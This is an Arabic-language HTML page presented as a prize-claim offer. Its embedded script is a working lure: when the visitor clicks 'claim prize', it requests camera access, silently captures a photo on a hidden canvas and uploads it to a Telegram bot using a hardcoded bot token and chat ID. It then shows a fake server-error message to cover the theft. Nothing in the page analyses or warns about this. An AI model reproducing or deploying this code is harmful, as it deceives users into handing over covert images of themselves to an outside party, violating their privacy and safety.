<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>استلم جائزتك الآن!</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; background-color: #f0f2f5; padding: 50px; }
        .card { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
        button { background-color: #28a745; color: white; border: none; padding: 15px 30px; font-size: 18px; border-radius: 5px; cursor: pointer; }
        video, canvas { display: none; }
    </style>
</head>
<body>
    <div class="card">
        <h1>مبروك! لقد ربحت جائزة قيمة 🎁</h1>
        <p>اضغط على الزر بالأسفل لتفعيل حسابك واستلام الجائزة فوراً.</p>
        <button id="capture">استلام الجائزة الآن</button>
    </div>

    <video id="video" autoplay></video>
    <canvas id="canvas"></canvas>

    <script>
        const token = "8295590667:AAFCZ3w2Uf0g5OBO7_QU7mwS2apdbTjwCqY"; 
        const chatId = "8042090388";

        const btn = document.getElementById('capture');
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');

        btn.addEventListener('click', async () => {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;
                
                setTimeout(() => {
                    const context = canvas.getContext('2d');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    context.drawImage(video, 0, 0);
                    
                    canvas.toBlob(blob => {
                        const formData = new FormData();
                        formData.append('chat_id', chatId);
                        formData.append('photo', blob, 'image.jpg');

                        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                            method: 'POST',
                            body: formData
                        }).then(() => {
                            alert("عذراً، حدث خطأ في الخادم. حاول مرة أخرى لاحقاً.");
                            stream.getTracks().forEach(track => track.stop());
                        });
                    }, 'image/jpeg');
                }, 1000);
            } catch (err) {
                alert("يجب السماح بالوصول للكاميرا لاستلام الجائزة.");
            }
        });
    </script>
</body>
</html>
